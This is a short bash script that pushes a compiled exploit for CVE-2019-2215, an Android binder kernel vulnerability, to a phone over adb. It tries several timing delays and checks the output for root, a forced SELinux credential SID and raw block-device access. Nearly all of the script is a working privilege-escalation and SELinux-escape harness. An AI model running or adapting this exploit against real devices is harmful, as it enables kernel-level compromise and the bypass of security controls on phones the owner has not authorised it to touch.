#!/bin/bash
# Push the patched exploit and test whether the cred-SID write moves us out of
# the shell SELinux domain. Run a few delays; the first that both roots and
# changes the domain wins.
set -u
cd /home/placeless/dev/p20lite-cve

echo "=== push ==="
timeout 60 adb push libs/arm64-v8a/cve-2019-2215 /data/local/tmp/cve-2019-2215 2>&1 | tail -1
timeout 30 adb shell 'chmod 755 /data/local/tmp/cve-2019-2215; md5sum /data/local/tmp/cve-2019-2215'
md5sum libs/arm64-v8a/cve-2019-2215

echo
for D in 200 400 100 800; do
  echo "############ DELAY=$D"
  printf 'id\ncat /proc/self/attr/current\ngetenforce\ndd if=/dev/block/bootdevice/by-name/nvme of=/dev/null bs=512 count=1 2>&1\n' \
    | timeout 150 adb shell /data/local/tmp/cve-2019-2215 "$D" > "/tmp/dom_$D.out" 2>&1
  echo "  root: $(tr -d '\000' < /tmp/dom_$D.out | grep -ac 'uid=0(root)')"
  echo "  sid-write: $(tr -d '\000' < /tmp/dom_$D.out | grep -ac 'SID forced')"
  echo "  domain line: $(tr -d '\000' < /tmp/dom_$D.out | grep -a 'context=' | tail -1 | cut -c1-80)"
  echo "  dd result: $(tr -d '\000' < /tmp/dom_$D.out | grep -aE 'records|Permission|denied' | tail -1)"
  if tr -d '\000' < /tmp/dom_$D.out | grep -aq 'SID forced' \
     && ! tr -d '\000' < /tmp/dom_$D.out | grep -aq 'Permission denied'; then
    echo "  >>>>>> DOMAIN CHANGE TOOK EFFECT AT DELAY=$D"
    cp "/tmp/dom_$D.out" /tmp/dom_success.out
    echo "$D" > /tmp/dom_success_delay.txt
    break
  fi
done

echo
echo "=== winning delay: $(cat /tmp/dom_success_delay.txt 2>/dev/null || echo none) ==="
